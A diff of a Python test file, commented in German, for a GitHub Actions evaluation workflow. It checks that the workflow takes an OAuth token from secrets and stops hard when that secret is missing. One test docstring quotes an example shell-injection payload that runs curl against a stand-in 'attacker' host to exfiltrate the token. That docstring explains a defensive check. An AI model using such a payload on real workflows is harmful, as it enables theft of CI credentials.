@@ -80,23 +80,29 @@ def test_workflow_runs_pytest_scoped_to_evals_dir_only():
     )
 
 
-def test_workflow_sets_anthropic_api_key_from_secrets():
-    """Der pytest-Step bekommt ANTHROPIC_API_KEY aus secrets, sonst bleibt es ein Skip-Lauf."""
+def test_workflow_sets_oauth_token_from_secrets():
+    """Der pytest-Step bekommt CLAUDE_CODE_OAUTH_TOKEN aus secrets, sonst bleibt es
+    ein Skip-Lauf (SDK-Pfad/ANTHROPIC_API_KEY entfallen seit Issue #716)."""
     job = _job(_load_workflow())
     steps = job.get("steps", [])
     envs = [s.get("env", {}) for s in steps]
-    assert any("ANTHROPIC_API_KEY" in env for env in envs), (
-        "Kein Step setzt ANTHROPIC_API_KEY -- der Lauf wuerde nur skippen, nicht real ausfuehren."
+    assert any("CLAUDE_CODE_OAUTH_TOKEN" in env for env in envs), (
+        "Kein Step setzt CLAUDE_CODE_OAUTH_TOKEN -- der Lauf wuerde nur skippen, "
+        "nicht real ausfuehren."
     )
-    key_env = next(v for env in envs for k, v in env.items() if k == "ANTHROPIC_API_KEY")
-    assert "secrets.ANTHROPIC_API_KEY" in str(key_env)
+    token_env = next(v for env in envs for k, v in env.items() if k == "CLAUDE_CODE_OAUTH_TOKEN")
+    assert "secrets.CLAUDE_CODE_OAUTH_TOKEN" in str(token_env)
+    assert not any("ANTHROPIC_API_KEY" in env for env in envs), (
+        "eval-behavior.yml setzt weiterhin ANTHROPIC_API_KEY -- der SDK-Pfad ist "
+        "mit Issue #716 entfallen."
+    )
 
 
 def test_workflow_aborts_hard_when_secret_missing():
     """Vorbedingung: ohne Secret bricht der Job ab statt taeuschend gruen zu skippen."""
     text = WORKFLOW.read_text(encoding="utf-8")
     assert "::error::" in text, (
-        "Workflow muss bei fehlendem ANTHROPIC_API_KEY hart mit ::error:: abbrechen "
+        "Workflow muss bei fehlendem CLAUDE_CODE_OAUTH_TOKEN hart mit ::error:: abbrechen "
         "(kein taeuschend gruener All-Skip-Lauf, Issue #470)."
     )
     assert "exit 1" in text
@@ -107,8 +113,9 @@ def test_workflow_dispatch_input_not_interpolated_directly_into_run_script():
     Recht kann ihn frei setzen). Direkte ``${{ inputs.* }}``-Interpolation in
     einem ``run:``-Skript ist Shell-/Template-Injection: GitHub Actions ersetzt
     den Ausdruck VOR der Shell-Auswertung textuell, ein Payload wie
-    ``$(curl attacker/-d $ANTHROPIC_API_KEY)`` wuerde als Shell-Code laufen und
-    koennte ``ANTHROPIC_API_KEY`` aus dem Step-Environment exfiltrieren. Muss
+    ``$(curl attacker/-d $CLAUDE_CODE_OAUTH_TOKEN)`` wuerde als Shell-Code laufen
+    und koennte ``CLAUDE_CODE_OAUTH_TOKEN`` aus dem Step-Environment
+    exfiltrieren. Muss
     stattdessen ueber ``env:`` gebunden und als Shell-Variable (``"$VAR"``)
     referenziert werden (Fix-Runde PR #504 / Issue #470)."""
     job = _job(_load_workflow())
